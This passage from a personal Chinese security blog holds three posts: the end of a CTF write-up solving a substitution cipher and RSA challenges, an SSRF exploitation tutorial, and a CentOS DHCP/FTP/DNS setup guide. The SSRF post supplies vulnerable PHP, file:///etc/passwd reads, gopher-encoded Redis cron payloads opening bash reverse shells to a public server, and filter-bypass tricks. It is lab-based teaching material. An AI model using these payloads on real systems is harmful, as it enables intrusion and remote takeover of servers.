dscqao qt dpqo aslckdqdqst, kzap su npqap qo jkfw mzoqa. Qu wse zfk qtdkfkodkh qt tkdnsfw okaefqdw, nkbaslk ds czfdqaqczdk. Bkd lk dkbb wse z odsfw. Q nzo pzjqtv hqttkf zd z fkodzefztd npkt Pzffw Odkkbk azlk qt, pk qo z Izcztkok ufsl Izczt med tsn pk qo tsd bqjqtv qt Izczt, lzwmk Pzffw qot&#39;d z Izcztkok tzlk med pk qo fkzbbw z Izcztkok. Pzffw nsfwkh qt z bznwkf&#39;o suuqak wkzfo zvs, med pk qo tsn nsfwqtv zd z mztw. Pk vkdo z vssh ozbzfw, med pk zbnzwo msffsno lstkw ufsl pqo ufqktho zth tkjkf czwo qd mzaw. Pzffw ozn lk zth azlk zthozdzd dpk ozlk dzmbk. Pk pzo tkjkf msffsnkh lstkw ufsl lk. Npqbk pk nzo kzdqtv, Q zowkh pql ds bkth lk &amp;2. Ds lw oefcfqok, pk vzjk lk dpk lstkw qllkhqzdkbw. &#39;Q pzjk tkjkf msfffsnkh ztw lstkw ufsl wse,&#39; Pzffw ozqh,&#39;os tsn wse azt czw usf lw hqttkf!&#39; Tsn q nqbb vqjk wse npzd wse nztd. MIH{cwdp0t_Mfed3_u0fa3_sF_geqcgeqc_ZQ_Af4aw} 最近大致看了单表替换密码，然后尝试一下，发现不对，emmmm。。。题目说是英语改过来的，然后就断了。现在看了眼wp：直接找个在线的 cryptogram solver 即可解密，比如quipqiup 最后一单词是错误的，hint 也告知有个地方需要自己修正。 可以看上面那段话也可以发现 worying at a bany，应该是 working at a bank，还有 networy，很明显应该是 network，y 要改成 k；直接读也发现 cracy 这个单词不对劲，应该和暴力破解是同类型的词，所以改成 Cr4ck rsa0这个和下一个RSA题确实不难，比较基础。然而我自己写的脚本没一点问题，但就是跑不出来flag。。。 e=14136631 p+q=20394044353540319344698711597000763057241436261142332048783203085936171963637690670301311997609844966417898713277046255478343038988123359477656058456834000 p-q=5522449249920590241682007593262770686168725602600804308006991053304611393109338497750661863149475602135542274713290715541748813086358892129600142665008034 c=57564160274404219264177459450448019183275693200768416051436640755522202963653292172391840912536831571152913328785130833906878324669454383965866712212130750436153700289781965212722910455077455251018758850662752081666673050509850478470173282957056988779851401898604824247631281201497321682899672172658697366350 flag=?????? 今天又试了下发现把除号/改为//就行了。。。吐血了。。。我写的脚本如下： import gmpy2 #import binascii from Crypto.Util import number x = 20394044353540319344698711597000763057241436261142332048783203085936171963637690670301311997609844966417898713277046255478343038988123359477656058456834000 y = 5522449249920590241682007593262770686168725602600804308006991053304611393109338497750661863149475602135542274713290715541748813086358892129600142665008034 c = 57564160274404219264177459450448019183275693200768416051436640755522202963653292172391840912536831571152913328785130833906878324669454383965866712212130750436153700289781965212722910455077455251018758850662752081666673050509850478470173282957056988779851401898604824247631281201497321682899672172658697366350 p=(x+y)//2 q=(x-y)//2 e=14136631 n=p*q phi_n = (p-1)*(q-1) d = gmpy2.invert(e,phi_n) m = pow(c, d, n) print(m) print(number.long_to_bytes(m)) #print(binascii.a2b_hex(hex(m)[2:]).decode(&quot;utf8&quot;)) rsa1已知p^2+q^2和p-q，联立方程组可解出p,q测试发现每访问一次，e和c都会变，但是p^2+q^2和p-q不变，于是考虑共模攻击： import binascii from gmpy2 import invert def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y) c1 = 51340645986680648867413444434228304851992739277782547454342697741865877392900511274202106134898112876825772319229557002425095759674232201185218757524610933637451782604059178975836061950941713112330334086056402131414410255457797205808339596344991620684466195920786350418186691414221753199930658493206062216077 e1 = 13718357 c2 = 34673873418492679189315841898257302722111171466584326793277718057977399831177294654520064866789128963244103911480691778143395640764793556758948086326518018815868320324938115520510369322851130777577637015710892435333961186906032753770892938649842321721053439688427769081850637260323730777408718564295395146991 e2 = 13103833 A = 120799346838375010895229335442462202865240248511497399986136417952902545991062894320724425829562051895373363854631133655790120865759504895601823054884863801257685969042479894585894024020955762745984438766369627115385495533880991887182178078779931382196022613790869270179113382812710158113446233023928865487250 B = -1733107409224230289530192248905424424390530237061955853090172443573881253991888010586951250583196318203113989146388752129146692980400782011939285226398736 n = (A-B**2)//2 s = egcd(e1, e2) s1 = s[1] s2 = s[2] if s1&lt;0: s1 = - s1 c1 = invert(c1, n) elif s2&lt;0: s2 = - s2 c2 = invert(c2, n) m = pow(c1,s1,n)*pow(c2,s2,n) % n print(binascii.a2b_hex(hex(m)[2:]).decode(&quot;utf8&quot;)) 0x03 后记随便写写就那么多字了。。。算了，Web复现再另起一篇进行记录。做题和复现BJD MISC和Crypto，我又收获一波新知识：新佛语解密、outguess隐写、多次输入密码解压压缩包脚本、圣堂武士密码和在线的cryptogram solver(quipqiup)，似乎就收获那么多。。。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/tags/CTF/"},{"name":"MISC","slug":"MISC","permalink":"https://qwzf.github.io/tags/MISC/"},{"name":"Crypto","slug":"Crypto","permalink":"https://qwzf.github.io/tags/Crypto/"},{"name":"BJDCTF","slug":"BJDCTF","permalink":"https://qwzf.github.io/tags/BJDCTF/"}],"author":"qwzf"},{"title":"SSRF漏洞的利用与攻击内网应用","slug":"SSRF漏洞的利用与攻击内网应用","date":"2020-03-21T14:40:20.000Z","updated":"2020-08-01T16:54:04.089Z","comments":true,"path":"2020/03/21/SSRF漏洞的利用与攻击内网应用/","link":"","permalink":"https://qwzf.github.io/2020/03/21/SSRF漏洞的利用与攻击内网应用/","excerpt":"","text":"首发于先知社区 0x00 前言学过CSRF漏洞后，收获颇多。同时发现SSRF漏洞和CSRF漏洞有一点点类似之处。CSRF跨站请求伪造，基于客户端的请求伪造；SSRF服务器端请求伪造，基于服务端的请求伪造。因为SSRF还没学习，所以还是先走上SSRF漏洞的学习之路吧！ 0x01 SSRF漏洞简介1.SSRF漏洞概述SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内网。也就是说可以利用一个网络请求的服务，当作跳板进行攻击）2.SSRF漏洞产生原因SSRF 形成的原因往往是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。如：从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。利用的就是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。 3.容易出现SSRF的地方 转码服务 在线翻译 图片加载与下载(通过URL地址加载或下载图片) 图片、文章收藏功能 网站采集、网页抓取的地方。 头像的地方。(远程加载头像) 一切要你输入网址的地方和可以输入ip的地方。 从URL关键字中寻找：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain… 4.利用SSRF可以实现的攻击 可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner 信息 攻击运行在内网或本地的应用程序 对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件) 攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli) 下载内网资源(如：利用file协议读取本地文件等) 进行跳板 无视cdn 利用Redis未授权访问，HTTP CRLF注入实现getshell 0x02 SSRF漏洞相关函数和协议1.函数file_get_contents()、fsockopen()、curl_exec()、fopen()、readfile()等函数使用不当会造成SSRF漏洞（1）file_get_contents() &lt;?php $url = $_GET[&#39;url&#39;];; echo file_get_contents($url); ?&gt; file_get_content函数从用户指定的url获取内容，然后指定一个文件名j进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。 （2）fsockopen() &lt;?php function GetFile($host,$port,$link) { $fp = fsockopen($host, intval($port), $errno, $errstr, 30); if (!$fp) { echo &quot;$errstr (error number $errno) \\n&quot;; } else { $out = &quot;GET $link HTTP/1.1\\r\\n&quot;; $out .= &quot;Host: $host\\r\\n&quot;; $out .= &quot;Connection: Close\\r\\n\\r\\n&quot;; $out .= &quot;\\r\\n&quot;; fwrite($fp, $out); $contents=&#39;&#39;; while (!feof($fp)) { $contents.= fgets($fp, 1024); } fclose($fp); return $contents; } } ?&gt; fsockopen函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限 （3）curl_exec() &lt;?php if (isset($_POST[&#39;url&#39;])){ $link = $_POST[&#39;url&#39;]; $curlobj = curl_init();// 创建新的 cURL 资源 curl_setopt($curlobj, CURLOPT_POST, 0); curl_setopt($curlobj,CURLOPT_URL,$link); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);// 设置 URL 和相应的选项 $result=curl_exec($curlobj);// 抓取 URL 并把它传递给浏览器 curl_close($curlobj);// 关闭 cURL 资源，并且释放系统资源 $filename = &#39;./curled/&#39;.rand().&#39;.txt&#39;; file_put_contents($filename, $result); echo $result; } ?&gt; curl_exec函数用于执行指定的cURL会话 注意 1.一般情况下PHP不会开启fopen的gopher wrapper 2.file_get_contents的gopher协议不能URL编码 3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败 4.curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用 5.curl_exec() //默认不跟踪跳转， 6.file_get_contents() // file_get_contents支持php://input协议 2.协议（1）file： 在有回显的情况下，利用 file 协议可以读取任意内容（2）dict：泄露安装软件版本信息，查看端口，操作内网redis服务等（3）gopher：gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell（4）http/s：探测内网主机存活 0x03 SSRF漏洞利用本地利用以curl举例，查看 curl 支持的协议列表 curl -V。本地利用方式：（1）使用file协议 file protocol (任意文件读取) curl -vvv &#39;file:///etc/passwd&#39; （2）使用dict协议 dict protocol (获取Redis配置信息) curl -vvv &#39;dict://127.0.0.1:6379/info&#39; （3）使用gopher协议(俗称万能协议) gopher protocol (一键反弹Bash) curl -vvv &#39;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#39; 远程利用1、环境攻击机ip：192.168.201.129、121.36.67.230攻击机：Kali、公网服务器远程服务器ip：39.x.x.xdocker镜像：ssrf_redisPHP版本：PHP Version 7.2.28(5.6版本测试会失败) 2、远程利用示例代码ssrf.php &lt;?php $ch = curl_init(); //创建新的 cURL 资源 curl_setopt($ch, CURLOPT_URL, $_GET[&#39;url&#39;]); //设置URL 和相应的选项 #curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_HEADER, 0); #curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_http); curl_exec($ch); //抓取 URL 内容并把它传递给浏览器，存储进文件 curl_close($ch); ////关闭 cURL 资源，并且释放系统资源 ?&gt; post.php &lt;html&gt; &lt;head&gt; &lt;title&gt;post&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;?php echo $_REQUEST[cmd]; ?&gt; &lt;/body&gt; &lt;/html&gt; 3、远程利用方式1.利用file协议任意文件读取 curl -v &#39;http://39.x.x.x:8000/ssrf.php?url=file:///etc/passwd&#39; 2.利用dict协议（1）查看端口及端口上运行服务的版本信息 curl -v &#39;http://39.x.x.x:8000/ssrf.php?url=dict://127.0.0.1:22/&#39; 说明22端口开放（2）通过dict协议getshell有关dict协议：向服务器的端口请求 命令:参数，并在末尾自动补上\\r\\n(CRLF)。dict协议要一条一条的执行，而gopher协议执行一条命令就行了。一条一条的执行就可以了。3.利用gopher协议（1）攻击内网redis并反弹shell利用redis未授权访问攻击redis攻击redis的exp echo -e &quot;\\n\\n\\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/121.36.67.230/5555 0&gt;&amp;1\\n\\n\\n&quot;|redis-cli -h $1 -p $2 -x set 1 redis-cli -h $1 -p $2 config set dir /var/spool/cron/ redis-cli -h $1 -p $2 config set dbfilename root redis-cli -h $1 -p $2 save redis-cli -h $1 -p $2 quit bash shell.sh 39.x.x.x 6379 从而捕获到数据，并进行转换转换规则如下：如果第一个字符是&gt;或者&lt;那么丢弃该行字符串，表示请求和返回的时间。如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。将\\r字符串替换成%0d%0a空白行替换为%0a 结合gopher协议攻击内网redis，使用上边捕获数据的转换结果即可，然后进行反弹shell： curl -v &#39;http://39.x.x.x:8000/ssrf.php?url=gopher://192.168.1.4:6379/_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f121.36.67.230%2f5555%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a&#39; 反弹成功http://39.x.x.x:8000/ssrf.php是存在SSRF漏洞的Web服务192.168.1.4是redis应用所在内网ip121.36.67.230是公网服务器，接收反弹shell（2）伪造post请求反弹shell curl -v &#39;http://39.x.x.x:8000/ssrf.php?url=gopher://192.168.1.5:80/_POST%20/post.php%20HTTP/1.1%250d%250aHost:%2039.105.93.165%250d%250aUser-Agent:%20curl/7.58.0%250d%250aAccept:%20*/*%250d%250aContent-Type:%20application/x-www-form-urlencoded%250d%250a%250d%250acmd%3Dccccc%250d%250a%250d%250abash%20-i%20%3E%26%20%2fdev%2ftcp%2f121.36.67.230%2f4444%200%3E%261&#39; 反弹成功192.168.1.5是内网Web服务，有post.php4 .利用http/s协议探测内网主机存活说明内网ip为192.168.1.3的主机存活 0x04 SSRF攻击应用实战1、gopher攻击redis参考远程利用 3.利用gopher协议 2、weblogic ssrf攻击redisCVE-2014-4210下载地址：https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf编译并启动环境 docker-compose build docker-compose up -d SSRF漏洞存在于http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp1.查看端口访问 /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:80 //测试http://127.0.0.1:7001：将80替换成7001 not connect，说明80端口未开放返回404，说明端口开放2.探测内网主机存活说明内网ip为192.168.1.1的主机存活3.注入HTTP头，利用Redis反弹shell通过ssrf探测内网中的redis服务器，发现172.22.0.2:6379可以连通和上边的远程利用几乎一样。将反弹shell脚本写入/etc/crontab定时任务 set 1 &quot;\\n\\n\\n\\n* * * * * root bash -i &gt;&amp; /dev/tcp/121.36.67.230/4444 0&gt;&amp;1\\n\\n\\n\\n&quot; config set dir /etc/ config set dbfilename crontab save 进行url编码 test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F121.36.67.230%2F4444%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa 换行符是“\\r\\n”换成“%0D%0A”。将url编码后的字符串放在ssrf的域名后面，发送反弹成功 0x05 SSRF漏洞相关绕过1、常用绕过方法1.@ http://abc@127.0.0.1 实际上是以用户名abc连接到站点127.0.0.1，同理 http://8.8.8.8@127.0.0.1:8080、http://127.0.0.1#8.8.8.8 在对@解析域名中，不同的处理函数存在处理差异，如：http://www.aaa.com@www.bbb.com@www.ccc.com在PHP的parse_url中会识别www.ccc.com，而`libcur`l则识别为www.bbb.com2.利用[::]可以利用[::]来绕过localhost http://[::]:80/ &gt;&gt;&gt; http://127.0.0.1 3.添加端口号 http://127.0.0.1:8080 4.利用短网址站长工具短网址百度短网址5.利用特殊域名原理是DNS解析。xip.io可以指向任意域名，即 127.0.0.1.xip.io，可解析为127.0.0.1 6.利用DNS解析在域名上设置A记录，指向127.0.17.利用进制转换 127.0.0.1八进制：0177.0.0.1十六进制：0x7f.0.0.1十进制：2130706433 8.句号 127。0。0。1 &gt;&gt;&gt; 127.0.0.1 9.302跳转使用http://tinyurl.com生成302跳转地址 2、常见限制1.限制为http://www.xxx.com 域名采用http基本身份认证的方式绕过。即@http://www.xxx.com@www.xxc.com2.限制请求IP不为内网地址当不允许ip为内网地址时（1）采取短网址绕过（2）采取特殊域名（3）采取进制转换3.限制请求只为http协议（1）采取302跳转（2）采取短地址 0x06 SSRF漏洞防御1、禁用不需要的协议(如：file:///、gopher://,dict://等)。仅仅允许http和http请求2、统一错误信息，防止根据错误信息判断端口状态3、禁止302跳转，或每次跳转，都检查新的Host是否是内网IP，直到抵达最后的网址4、设置URL白名单或者限制内网IP 0x07 后记在SSRF漏洞的学习过程中，遇到了一些问题，比如反弹shell到公网服务器，折腾了许久。不过最终克服了问题。同时，通过SSRF漏洞的学习，发现SSRF漏洞果然比CSRF漏洞的利用的局限性要小，并且SSRF漏洞的对内网的一些应用危害比较大。所以在开发过程中，要尽量避免产生SSRF漏洞。 参考博客：SSRF 漏洞学习SSRF——weblogic vulhub 漏洞复现及攻击内网redis（一）ssrf攻击内网应用SSRF绕过方法总结","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://qwzf.github.io/categories/漏洞原理/"},{"name":"SSRF漏洞","slug":"漏洞原理/SSRF漏洞","permalink":"https://qwzf.github.io/categories/漏洞原理/SSRF漏洞/"}],"tags":[{"name":"相关函数和协议","slug":"相关函数和协议","permalink":"https://qwzf.github.io/tags/相关函数和协议/"},{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://qwzf.github.io/tags/漏洞利用/"}],"author":"qwzf"},{"title":"Centos-DHCP、FTP和DNS搭建与配置","slug":"Centos-DHCP、FTP和DNS搭建与配置","date":"2020-03-11T14:05:25.000Z","updated":"2020-08-01T15:54:38.915Z","comments":true,"path":"2020/03/11/Centos-DHCP、FTP和DNS搭建与配置/","link":"","permalink":"https://qwzf.github.io/2020/03/11/Centos-DHCP、FTP和DNS搭建与配置/","excerpt":"","text":"0x00 前言记录一下，Linux网络与集群管理这门课程的一些服务搭建与管理配置。以下服务都是在Centos进行搭建的。 0x01 DHCP服务器的搭建与配置DHCP服务器作用：为大量客户机自动分配地址，提供集中管理减轻管理和维护成本、提高网络配置效率DHCP原理OFFER只有ip、ACK分配DNS等。DHCP相关配置1、端口：udp67 udp682、服务： dhcp dhrelay3、配置文件：/etc/dhcp/dhcpd.conf​4、中继文件：/etc/sysconfig/dhcrelay 1、DHCP安装yum –y install dhcp 2、DHCP配置1.查找并复制模板文件 #查找dhcp服务的配置模版文件。example有的是sample、 rpm -ql dhcp | grep dhcpd.conf.example #复制配置模板并到/etc/dhcp/dhcpd.conf cp -rf /usr/share/doc/dhcp-4.2.5/dhcpd.conf.example /etc/dhcp/dhcpd.conf 2.修改dhcp配置文件 #修改dhcp配置文件，全局配置,在配置文件修改以下内容 vi /etc/dhcp/dhcpd.conf subnet 192.168.1.0 netmask 255.255.255.0 { #网段声明 subnet +网段 netmask+子网掩码 range 192.168.1.100 192.168.1.200; #设置用于分配的ip地址池 option domain-name-servers 2.2.2.2, 3.3.3.3; #配置DNS 服务器 option routers 192.168.1.255; #设置客户机的默认网关 #option broadcast-address #广播地址 default-lease-time 600; #默认租约时间 max-lease-time 7200; #指定最大租赁时间长度 } #host qwzf { #主机声明，&quot;qwzf&quot;自己起的名字 #hardware ethernet MAC地址 #指定其它pc（打印机）mac地址 #fixed-address 192.168.1.100; #固定地址 #} 3.启动dhcp、检查和关闭防火墙 service dhcpd start #启动 netstat -anpu | grep dhcp #查看67端口是否工作 systemctl stop firewalld #关闭防火墙 setenforce 0 #关闭selinux防火墙 3、客户端验证分别用Centos Linux和Win7进行验证。1.Centos（1）编辑网卡配置文件 vi /etc/sysconfig/network-scripts/ifcfg-eth0 （2）修改配置文件 ONBOOT=yes是指系统启动时激活此设备 BOOTPROTO=dhcp是指网卡的获取IP方式为dhcp 想要改成静态获取的，可以把这个值设为static （3）保存退出，重启网卡 service network restart 当然也可以用 ifup #或ifconfig eth0 up ifdown #或ifconfig eth0 down #激活与关闭某个网络适配卡 在客户端输入ifconfig，可以看到成功分配ip。当然，如果不放心。可以复制客户端的mac地址，在服务器端粘贴mac，并配置指定分配ip。从而可以在客户端看到分配的指定ip。2.Win7直接在控制面板-&gt;网络和 Internet-&gt;网络连接。选择相应网卡，配置成自动获取ip，然后重启网卡。然后就可以看到成功分配ip。 4、DHCP中继服务器因为配置需要的虚拟机过多，这里就不验证了。可以参考下面的博客：CentOS7.3下关于DHCP中继代理服务器的详细配置 0x02 FTP服务器的搭建与配置1、概述File Transfer Protocol(文件传输协议)，用于Internet上的控制文件的双向传输。“下载”和“上传”支持FTP协议的服务器就是FTP服务器。FTP连接及传输模式控制连接：TCP 21，用于发送FTP命令信息数据连接：TCP 20，用于上传、下载数据。数据连接的建立类型主动模式：服务器从20端主动向客户端发起连接被动模式：服务器在指定范围内某个端口被动等待客户端连接。(服务器开启相应端口，等待客户端发起连接)主动模式端口：控制 21 传输数据 20被动模式，服务端开启的端口随机FTP用户的类型匿名用户：anonymous、ftp本地用户：账户名称、密码等信息保存在passwd、shadow文件中常见的FTP服务器程序IIS、Serv-Uwu-ftp、Proftpdvsftpd（Very Secure FTP Daemon）常见的FTP客户端程序CuteFTP、FlashFXP、LeapFTP、Filezillagftp、kuftpFTP命令vsftpd软件包 官方站点：https://vsftpd.beasts.org/ 主程序：/usr/sbin/vsftpd 用户控制列表文件：/etc/vsftpd/ftpusers/etc/vsftpd/user_list 主配置文件：/etc/vsftpd/vsftpd.conf 2、FTP服务器搭建1.服务器端安装与配置1.安装vsftpd yum -y install vsftpd 2.开启vsftpd service vsftpd start 3.关闭防火墙和selinux iptables -F setenforce 0 4.配置ftp权限 vi /etc/vsftpd/vsftpd.conf #列出没有被注释的信息 grep -v &quot;#&quot; vsftpd.conf #开启权限(启用匿名访问)： anonymous_enable=YES #允许上传文件 anon_upload_enable=YES #匿名用户所上传文件的权限掩码（默认600） anon_umask=022 #设置目录权限，改属主 chown ftp /var/ftp/pub service vsftpd restart # 重启 3、客户端验证1.安装ftp yum -y install ftp 2.使用匿名用户登录ftp ftp 192.168.x.x 登录是否成功，看是否有Successful ftp或anonymous #不需要密码 3.匿名用户登录ftp进行上传与下载 !dir #列目录 上传准备： 1.修改配置文件里两个项目： #开启权限(启用匿名访问)： anonymous_enable=YES #允许上传文件 anon_upload_enable=YES 2.上传的文件夹要放开写权限 3.服务器上的上传文件夹要放开写权限 service vsftpd restart # 重启 put 文件名 #上传 get 文件名 #下载 上传下载 4.使用本地用户登录ftp（1）服务端 #可关闭匿名登录模式，即设置anonymous_enable=NO #允许本地用户登录FTP vi /etc/vsftpd/vsftpd.conf local_enable=YES #默认是开启的 write_enable=YES （2）客户端：本地用户的工作目录在/home/用户名，如/home/ftpwmm ftp 192.168.x.x 用户名 #需要密码 扩充1：禁止某用户登录默认禁止root身份登录。编辑user_list文件，在列表中添加ftpwmm，则会禁止ftpwmm用户访问 vi /etc/vsftpd/user_list 扩充2：配置默认访问路径 #配置默认访问路径，local_root 针对系统用户；anon_root 针对匿名用户 vi /etc/vsftpd/vsftpd.conf local_root=/var/ftp/local_pub chroot_local_user=YES service vsftpd restart # 重启 0x03 DNS服务器的搭建与配置域名解析器host文件：hosts文件记录主机域名和ip的对应文件NIS服务器：库存放解析记录DNS服务器：用库存放目录，分布式解析 1、域名服务器简介1.DNS作用正向解析：将域名(FQDN)解析成ip反向解析：将ip解析成域名(FQDN) FQDN：Full Qualified Domain Name完全合格域名（完整域名）一个域名对应一个ip一个ip可以对应多个域名 2.DNS的工作模式递归查询(不管是否访问成功，访问一去一回)迭代查询(多次询问，多次返回结果)3.域名结构. 根域.com .net….顶级域名.com.cn …….二级域www、mail…主机名4.根DNS共有13台M在日本，暂时查不到。5.域名服务器分类主域名服务器特定DNS区域的官方服务器，具有唯一性负责维护该区域内所有域名-&gt;ip地址的映射记录从域名服务器也称为辅助域名服务器其维护的 域名-&gt;ip地址记录 来源于主域名服务器缓存域名服务器可运行域名服务器软件，提供间接信息转发域名服务器负责所有非本地域名的本地查询6.bind软件包 BIND伯克利Internet域名服务官方站点：https://www.isc.org(ftp://www.isc.org)软件包：bind-x.x.x…..rpm服务名：named端口号：53主配置文件：/etc/named.conf保存DNS解析记录的数据文件位于：/var/named 2、域名服务器安装和配置查看默认安装根域名服务器 vi /var/named/named.ca 1.安装 yum -y install bind* bind：DNS服务器软件包bind-utils：DNS测试工具bind-chroot：使bind运行在指定目录(可安装，安装后很多默认位置发生改变)如果安装bind-chroot(我这里感觉麻烦，没安装) cp /etc/named.conf /var/nammed/chroot/etc caching-nameserver：高速缓冲DNS服务器基本配置文件配置文件详解（1）/etc/named.conf主配置文件 vi /etc/named.conf options { listen-on port 53 { 127.0.0.1; }; #监听地址和端口，如果删除，会默认在所有接口UDP 53 端口监听服务 listen-on-v6 port 53 { ::1; }; directory &quot;/var/named&quot;; #数据文件存放的目录(解析文件) dump-file &quot;/var/named/data/cache_dump.db&quot;; #缓存数据库文件 statistics-file &quot;/var/named/data/named_stats.txt&quot;; #状态统计文件的位置 memstatistics-file &quot;/var/named/data/named_mem_stats.txt&quot;; recursing-file &quot;/var/named/data/named.recursing&quot;; secroots-file &quot;/var/named/data/named.secroots&quot;; allow-query { localhost; }; #允许哪些网段的客户端使用DNS进行解析。若设置成any则对所有网段进行解析 （2）/etc/named.rfc1912.zones区域配置文件 zone &quot;localhost.localdomain&quot; IN { #zone表示区域,in跳转指针 type master; #主DNS服务器 file &quot;named.localhost&quot;; #指定正向解析数据文件位置 allow-update { none; }; }; zone &quot;1.0.0.127.in-addr.arpa&quot; IN { type master; file &quot;named.loopback&quot;; ##指定反向解析数据文件位置 allow-update { none; }; }; （3）数据文件正向解析模板文件：/var/named/named.localhost $TTL 1D @ IN SOA @ rname.invalid. ( #@表示当前所在域域名，配置改成具体域名。rname.invalid.管理员邮箱 0 ; serial 1D ; refresh #时间D表示天，W表示周 1H ; retry 1W ; expire 3H ) ; minimum NS @ A 127.0.0.1 AAAA ::1 反向解析模板文件：/var/named/named.empty $TTL 3H @ IN SOA @ rname.invalid. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS @ A 127.0.0.1 AAAA ::1 2.关闭防火墙和selinux iptables -F #检查是否关闭getenforce setenforce 0 3.配置文件 配置ip：ifconfig eth0 192.168.1.33 （1）修改主配置文件/etc/named.conf listen-on port 53 { 192.168.1.33; }; allow-query { 192.168.1.0/24; }; #指定网段，也可以写成any所有网段 （2）修改区域文件/etc/named.rfc1912.zones1）备份 cp /etc/named.rfc1912.zones /etc/named.rfc1912.zones.bak 2）修改可删掉注释信息和无用项，只保留正向和反向 zone &quot;qwzf.com&quot; IN { #zone表示区域,in跳转指针 type master; #主要区域 file &quot;qwzf.com.zone&quot;; #指定解析记录数据文件位置 allow-update { none; }; }; zone &quot;1.168.192.in-addr.arpa&quot; IN { type master; file &quot;192.168.1.zone&quot;; allow-update { none; }; }; （3）修改数据文件1）复制模板文件到指定数据文件 cp -p /var/named/named.localhost /var/named/qwzf.com.zone #正向 cp -p /var/named/named.empty /var/named/192.168.1.zone #反向 #-p保存属性 2）修改正向解析文件qwzf.com.zone $TTL 1D @ IN SOA qwzf.com. rname.invalid. ( #@表示当前所在域域名，配置改成具体域名。rname.invalid.管理员邮箱 0 ; serial 1D ; refresh #时间D表示天，W表示周 1H ; retry 1W ; expire 3H ) ; minimum NS dns.qwzf.com. MX 5 mail.qwzf.com. #设置邮件域名服务器，数字越小优先级越高 dns A 192.168.1.33 mail A 192.168.1.34 www A 192.168.1.35 ftp CNAME www * A 192.168.1.100 #提供泛域名解析 3）修改反向解析文件192.168.1.zone $TTL 3H @ IN SOA qwzf.com. rname.invalid. ( 0 ; serial 1D ; refresh 1H ; retry 1W ; expire 3H ) ; minimum NS dns.qwzf.com. MX 5 mail.qwzf.com. 33 PTR dns.qwzf.com. 34 PTR mail.qwzf.com. 35 PTR www.qwzf.com. * PTR xxx.qwzf.com. 4.启动 service named start 3、客户端验证添加dns服务器 vi /etc/sysconfig/network-scripts/ifcfg-eth0 #DNS1=192.168.1.33 重启网卡 service network restart 测试 nslookup #安装 nslookup, 直接安装bind-utils即可。yum -y install bind-utils 测试成功，ok。 0x04 